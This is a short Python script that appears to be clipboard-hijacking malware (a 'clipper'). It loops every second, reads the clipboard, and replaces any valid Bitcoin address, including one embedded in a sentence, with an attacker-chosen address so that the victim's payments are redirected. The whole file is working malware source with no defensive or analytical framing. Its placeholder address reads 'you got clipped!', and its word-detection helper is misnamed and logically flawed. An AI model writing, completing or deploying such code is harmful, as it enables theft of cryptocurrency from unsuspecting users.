import re
import asyncio

from helpers.bitcoin import bitcoin
from helpers.clipboard import clipboard
from helpers.clipboard import set_contents
    
def containsMultipleWords(string: str) -> bool:
    try:
        sentence = string.strip()
        
        return bool(re.search(r'\b\w+\b', sentence))
    except: 
        return

async def bitcoinClipper(switch_address: str):
    while True:
        await asyncio.sleep(1)
        
        clipboard_contents: str = clipboard.contents()
        
        if containsMultipleWords(clipboard_contents):
            clipboard.set_sentence(clipboard_contents, switch_address)
        else:
            if bitcoin.is_valid_address(clipboard_contents):
                set_contents(switch_address)


if __name__ == "__main__":
    switch_address: str = "you got clipped!"
    
    asyncio.run(bitcoinClipper(switch_address=switch_address))